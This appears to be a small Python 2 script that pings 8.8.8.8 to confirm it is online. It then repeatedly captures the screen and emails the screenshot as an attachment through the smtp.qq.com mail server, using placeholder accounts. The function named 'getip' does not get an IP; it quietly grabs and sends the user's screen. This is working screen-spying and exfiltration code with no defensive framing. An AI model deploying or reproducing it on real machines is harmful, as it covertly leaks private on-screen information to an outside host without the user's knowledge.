import os
import socket
import smtplib
import time
import mimetypes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import PIL
from PIL import Image,ImageGrab

def getip():
    localip = socket.gethostbyname(socket.gethostname())
    msg = MIMEMultipart()
    msg['From']="from@qq.com"
    msg['To']="to@qq.com"
    msg['Subject']= "Grab the Screen and send, test."

    txt = MIMEText("this is content of email ")
    msg.attach(txt)
    im = ImageGrab.grab()
    im.save("d:\sketch.png")
    fileName = "d:\sketch.png"
    ctype,encoding = mimetypes.guess_type(fileName)
    if ctype is None or encoding is not None:
        ctype = "application/octet-stream"
    maintype,subtype = ctype.split('/',1)
    att1 = MIMEImage((lambda f: (f.read(), f.close()))(open(fileName, 'rb'))[0], _subtype = subtype)
    att1.add_header('Content-Disposition','attachment',filename=fileName)
    msg.attach(att1)
    
    smtp = smtplib.SMTP()
    smtp.connect("smtp.qq.com","25")
    smtp.login("from@qq.com","123")
    smtp.sendmail("from@qq.com","to@qq.com",msg.as_string())
    smtp.quit()

def test2():
    import os
    import subprocess
    
    fnull = open(os.devnull, 'w')
    return1 = subprocess.call('ping 8.8.8.8', shell = True, stdout = fnull, stderr = fnull)
    fnull.close()
    if return1:
      return False
    else:
      getip()
      return True
i=0
while 1:
    print "new loop:" + str(i)
    t = test2()
    if t == False:
        time.sleep(30)
        
    else:
        time.sleep(3)
        i=i+1
        if i==3:
            break
        

        

